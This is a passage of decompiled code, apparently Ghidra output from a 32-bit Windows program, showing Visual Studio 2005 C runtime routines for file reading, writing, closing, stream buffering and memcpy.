        psVar8 = (short *)((int)psVar8 + -1);
        bVar3 = *(byte *)psVar8;
        iVar12 = iVar12 + 1;
      }
      if ((char)(&DAT_00422650)[*(byte *)psVar8] == 0) {
        piVar7 = __errno();
        *piVar7 = 0x2a;
        goto LAB_0040faeb;
      }
      if ((char)(&DAT_00422650)[*(byte *)psVar8] + 1 == iVar12) {
        psVar8 = (short *)((int)psVar8 + iVar12);
      }
      else if ((*(byte *)(*piVar7 + iVar14 + 4) & 0x48) == 0) {
        __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar12 >> 0x1f),unaff_EBX);
      }
      else {
        psVar15 = (short *)((int)psVar8 + 1);
        *(byte *)(*piVar7 + iVar14 + 5) = *(byte *)psVar8;
        if (1 < iVar12) {
          *(undefined *)(iVar14 + 0x25 + *piVar7) = *(undefined *)psVar15;
          psVar15 = psVar8 + 1;
        }
        if (iVar12 == 3) {
          *(undefined *)(iVar14 + 0x26 + *piVar7) = *(undefined *)psVar15;
          psVar15 = (short *)((int)psVar15 + 1);
        }
        psVar8 = (short *)((int)psVar15 - iVar12);
      }
    }
    local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,(int)psVar8 - (int)local_10,
                                            (LPWSTR)_DstBuf,uVar2 >> 1);
    if (local_14 != (short *)0x0) {
      local_14 = (short *)((int)local_14 * 2);
      goto LAB_0040faef;
    }
    uVar13 = GetLastError();
LAB_0040fae4:
    __dosmaperr(uVar13);
  }
LAB_0040faeb:
  local_18 = -1;
LAB_0040faef:
  if (local_10 != (short *)_DstBuf) {
    _free(local_10);
  }
  if (local_18 == -2) {
    return (int)local_14;
  }
  return local_18;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2005 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0040fd5e();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040fd5e(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_00425820 + 0x54) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_00425820 + 0x2c) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_0040fdc7;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040fdc9;
    }
  }
LAB_0040fdc7:
  DVar4 = 0;
LAB_0040fdc9:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_00425820)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x28) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2005 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_0040febf();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040febf(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2005 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2005 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined *puVar3;
  int iVar4;
  int unaff_EDI;
  uint uVar5;
  longlong lVar6;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar5 = _File_00->_flag;
  if ((uVar5 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040ff19:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar5 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0040ff19;
  }
  if ((uVar5 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar5 & 0x10) == 0) {
      _File_00->_flag = uVar5 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar5 & 0xfffffffe;
  }
  uVar5 = _File_00->_flag;
  _File_00->_flag = uVar5 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar5 & 0x10c) == 0) &&
     (((puVar3 = FUN_0040d523(), _File_00 != (FILE *)(puVar3 + 0x20) &&
       (puVar3 = FUN_0040d523(), _File_00 != (FILE *)(puVar3 + 0x40))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((*(ushort *)&_File_00->_flag & 0x108) == 0) {
    uVar5 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar5 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar5 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar3 = &DAT_00422448;
      }
      else {
        puVar3 = (undefined *)(((uint)_File & 0x1f) * 0x28 + (&DAT_00425820)[(int)_File >> 5]);
      }
      if (((puVar3[4] & 0x20) != 0) &&
         (lVar6 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar6 == -1)) goto LAB_0041003f;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar5);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar5) {
    return _Ch & 0xff;
  }
LAB_0041003f:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR *pWVar1;
  char cVar2;
  WCHAR WVar3;
  wchar_t *pwVar4;
  wint_t wVar5;
  ulong *puVar6;
  int *piVar7;
  int iVar8;
  _ptiddata p_Var9;
  BOOL BVar10;
  DWORD nNumberOfBytesToWrite;
  int iVar11;
  uint uVar12;
  WCHAR *pWVar13;
  uint uVar14;
  char *pcVar15;
  ulong uVar16;
  int unaff_EDI;
  UINT local_598;
  uint local_594;
  WCHAR *local_590;
  int *local_58c;
  char *local_588;
  int local_584;
  WCHAR *local_580;
  char *local_57c;
  WCHAR *local_578;
  char local_571;
  DWORD local_570;
  WCHAR *local_56c;
  WCHAR local_568 [38];
  undefined local_51c [264];
  CHAR local_414 [688];
  WCHAR local_164 [170];
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_51c;
  local_580 = (WCHAR *)_Buf;
  local_57c = (char *)0x0;
  local_584 = 0;
  if (_MaxCharCount == 0) goto LAB_00410605;
  if (_Buf == (void *)0x0) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_00410605;
  }
  iVar11 = (_FileHandle & 0x1fU) * 0x28;
  piVar7 = &DAT_00425820 + (_FileHandle >> 5);
  local_571 = (char)(*(char *)(*piVar7 + iVar11 + 0x24) * '\x02') >> 1;
  local_58c = piVar7;
  if (((local_571 == '\x02') || (local_571 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_00410605;
  }
  if ((*(byte *)(*piVar7 + iVar11 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar8 = __isatty(_FileHandle);
  if ((iVar8 == 0) || ((*(byte *)(iVar11 + 4 + *piVar7) & 0x80) == 0)) {
LAB_00410340:
    if ((*(byte *)((HANDLE *)(*piVar7 + iVar11) + 1) & 0x80) == 0) {
      BVar10 = WriteFile(*(HANDLE *)(*piVar7 + iVar11),local_580,_MaxCharCount,(LPDWORD)&local_588,
                         (LPOVERLAPPED)0x0);
      if (BVar10 == 0) {
LAB_0041059a:
        local_570 = GetLastError();
      }
      else {
        local_570 = 0;
        local_57c = local_588;
      }
LAB_004105a3:
      piVar7 = local_58c;
      if (local_57c != (char *)0x0) goto LAB_00410605;
      goto LAB_004105ad;
    }
    local_570 = 0;
    if (local_571 == '\0') {
      local_56c = local_580;
      if (_MaxCharCount == 0) goto LAB_004105d4;
      do {
        local_578 = (WCHAR *)0x0;
        uVar12 = (int)local_56c - (int)local_580;
        pWVar13 = local_568;
        do {
          if (_MaxCharCount <= uVar12) break;
          pWVar1 = (WCHAR *)((int)local_56c + 1);
          cVar2 = *(char *)local_56c;
          uVar12 = uVar12 + 1;
          if (cVar2 == '\n') {
            local_584 = local_584 + 1;
            *(char *)pWVar13 = '\r';
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_578 = (WCHAR *)((int)local_578 + 1);
          }
          *(char *)pWVar13 = cVar2;
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_578 = (WCHAR *)((int)local_578 + 1);
          local_56c = pWVar1;
        } while (local_578 < (WCHAR *)0x400);
        BVar10 = WriteFile(*(HANDLE *)(iVar11 + *piVar7),local_568,(int)pWVar13 - (int)local_568,
                           (LPDWORD)&local_588,(LPOVERLAPPED)0x0);
        if (BVar10 == 0) goto LAB_0041059a;
        local_57c = local_57c + (int)local_588;
      } while (((int)pWVar13 - (int)local_568 <= (int)local_588) &&
              ((uint)((int)local_56c - (int)local_580) < _MaxCharCount));
      goto LAB_004105a3;
    }
    if (local_571 == '\x02') {
      local_56c = local_580;
      if (_MaxCharCount != 0) {
        do {
          uVar14 = 0;
          uVar12 = (int)local_56c - (int)local_580;
          pWVar13 = local_568;
          do {
            if (_MaxCharCount <= uVar12) break;
            pWVar1 = local_56c + 1;
            WVar3 = *local_56c;
            uVar12 = uVar12 + 2;
            if (WVar3 == L'\n') {
              local_584 = local_584 + 2;
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              uVar14 = uVar14 + 2;
            }
            *pWVar13 = WVar3;
            pWVar13 = pWVar13 + 1;
            uVar14 = uVar14 + 2;
            piVar7 = local_58c;
            local_56c = pWVar1;
          } while (uVar14 < 0x3ff);
          BVar10 = WriteFile(*(HANDLE *)(iVar11 + *piVar7),local_568,(int)pWVar13 - (int)local_568,
                             (LPDWORD)&local_588,(LPOVERLAPPED)0x0);
          if (BVar10 == 0) goto LAB_0041059a;
          local_57c = local_57c + (int)local_588;
        } while (((int)pWVar13 - (int)local_568 <= (int)local_588) &&
                ((uint)((int)local_56c - (int)local_580) < _MaxCharCount));
        goto LAB_004105a3;
      }
    }
    else {
      local_578 = local_580;
      if (_MaxCharCount != 0) {
        do {
          local_56c = (WCHAR *)0x0;
          uVar12 = (int)local_578 - (int)local_580;
          pWVar13 = local_164;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar3 = *local_578;
            local_578 = local_578 + 1;
            uVar12 = uVar12 + 2;
            if (WVar3 == L'\n') {
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              local_56c = local_56c + 1;
            }
            local_56c = local_56c + 1;
            *pWVar13 = WVar3;
            pWVar13 = pWVar13 + 1;
          } while (local_56c < (WCHAR *)0x152);
          pcVar15 = (char *)0x0;
          iVar8 = WideCharToMultiByte(0xfde9,0,local_164,((int)pWVar13 - (int)local_164) / 2,
                                      local_414,0x2ab,(LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar8 == 0) goto LAB_0041059a;
          do {
            BVar10 = WriteFile(*(HANDLE *)(iVar11 + *local_58c),local_414 + (int)pcVar15,
                               iVar8 - (int)pcVar15,(LPDWORD)&local_588,(LPOVERLAPPED)0x0);
            if (BVar10 == 0) {
              local_570 = GetLastError();
              break;
            }
            pcVar15 = pcVar15 + (int)local_588;
          } while ((int)pcVar15 < iVar8);
        } while ((iVar8 <= (int)pcVar15) &&
                (local_57c = (char *)((int)local_578 - (int)local_580), local_57c < _MaxCharCount));
        goto LAB_004105a3;
      }
    }
LAB_004105d4:
    uVar16 = 0;
    if (((*(byte *)(iVar11 + 4 + *piVar7) & 0x40) != 0) && (*(char *)local_580 == '\x1a'))
    goto LAB_00410605;
    piVar7 = __errno();
    *piVar7 = 0x1c;
  }
  else {
    p_Var9 = __getptd();
    pwVar4 = p_Var9->ptlocinfo->lc_category[0].wlocale;
    BVar10 = GetConsoleMode(*(HANDLE *)(iVar11 + *piVar7),&local_598);
    if ((BVar10 == 0) || ((pwVar4 == (wchar_t *)0x0 && (local_571 == '\0')))) goto LAB_00410340;
    local_598 = GetConsoleCP();
    local_56c = (WCHAR *)0x0;
    local_590 = local_580;
    if (_MaxCharCount != 0) {
      local_578 = (WCHAR *)0x0;
      do {
        pWVar13 = local_590;
        if (local_571 == '\0') {
          cVar2 = *(char *)local_590;
          local_594 = (uint)(cVar2 == '\n');
          iVar8 = _isleadbyte(CONCAT22(cVar2 >> 7,(short)cVar2));
          if (iVar8 == 0) {
            iVar8 = _mbtowc((wchar_t *)&local_570,(char *)pWVar13,1);
            if (iVar8 == -1) break;
          }
          else {
            if (((char *)((int)local_580 + (_MaxCharCount - (int)pWVar13)) < (char *)0x2) ||
               (iVar8 = _mbtowc((wchar_t *)&local_570,(char *)pWVar13,2), iVar8 == -1)) break;
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_578 = (WCHAR *)((int)local_578 + 1);
          }
          local_590 = (WCHAR *)((int)pWVar13 + 1);
          local_578 = (WCHAR *)((int)local_578 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_598,0,(LPCWSTR)&local_570,1,local_10,5,(LPCSTR)0x0,
                                   (LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar10 = WriteFile(*(HANDLE *)(iVar11 + *piVar7),local_10,nNumberOfBytesToWrite,
                             (LPDWORD)&local_56c,(LPOVERLAPPED)0x0);
          if (BVar10 == 0) goto LAB_0041059a;
          local_57c = local_57c + (int)local_56c;
          if ((int)local_56c < (int)nNumberOfBytesToWrite) break;
          if (local_594 != 0) {
            local_10[0] = '\r';
            BVar10 = WriteFile(*(HANDLE *)(iVar11 + *piVar7),local_10,1,(LPDWORD)&local_56c,
                               (LPOVERLAPPED)0x0);
            if (BVar10 == 0) goto LAB_0041059a;
            if ((int)local_56c < 1) break;
            local_584 = local_584 + 1;
            local_57c = local_57c + 1;
          }
        }
        else {
          if ((local_571 == '\x01') || (local_571 == '\x02')) {
            local_570 = (DWORD)(ushort)*local_590;
            local_594 = (uint)(*local_590 == L'\n');
            local_590 = local_590 + 1;
            local_578 = local_578 + 1;
          }
          if ((local_571 == '\x01') || (local_571 == '\x02')) {
            wVar5 = __putwch_nolock((wchar_t)local_570);
            if (wVar5 != (wint_t)local_570) goto LAB_0041059a;
            local_57c = local_57c + 1;
            if (local_594 != 0) {
              local_570 = 0xd;
              wVar5 = __putwch_nolock(L'\r');
              if (wVar5 != (wint_t)local_570) goto LAB_0041059a;
              local_57c = local_57c + 1;
              local_584 = local_584 + 1;
            }
          }
        }
      } while (local_578 < _MaxCharCount);
      goto LAB_004105a3;
    }
LAB_004105ad:
    if (local_570 == 0) goto LAB_004105d4;
    uVar16 = 5;
    if (local_570 != 5) {
      __dosmaperr(local_570);
      goto LAB_00410605;
    }
    piVar7 = __errno();
    *piVar7 = 9;
  }
  puVar6 = ___doserrno();
  *puVar6 = uVar16;
LAB_00410605:
  iVar11 = ___security_check_cookie_4(local_8 ^ (uint)local_51c);
  return iVar11;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2005 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_004106ed();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_004106ed(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_004108e3_caseD_2;
        case 3:
          goto switchD_004108e3_caseD_3;
        }
        goto switchD_004108e3_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_004108e3_caseD_0;
      case 1:
        goto switchD_004108e3_caseD_1;
      case 2:
        goto switchD_004108e3_caseD_2;
      case 3:
        goto switchD_004108e3_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004108e3_caseD_2;
            case 3:
              goto switchD_004108e3_caseD_3;
            }
            goto switchD_004108e3_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004108e3_caseD_2;
            case 3:
              goto switchD_004108e3_caseD_3;
            }
            goto switchD_004108e3_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004108e3_caseD_2;
            case 3:
              goto switchD_004108e3_caseD_3;
            }
            goto switchD_004108e3_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_004108e3_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_004108e3_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_004108e3_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_004108e3_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_004257e4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0041075c_caseD_2;
      case 3:
        goto switchD_0041075c_caseD_3;
      }
      goto switchD_0041075c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0041075c_caseD_0;
    case 1:
      goto switchD_0041075c_caseD_1;
    case 2:
      goto switchD_0041075c_caseD_2;
    case 3:
      goto switchD_0041075c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041075c_caseD_2;
          case 3:
            goto switchD_0041075c_caseD_3;
          }
          goto switchD_0041075c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041075c_caseD_2;
          case 3:
            goto switchD_0041075c_caseD_3;
          }
          goto switchD_0041075c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041075c_caseD_2;
          case 3:
            goto switchD_0041075c_caseD_3;
          }
          goto switchD_0041075c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
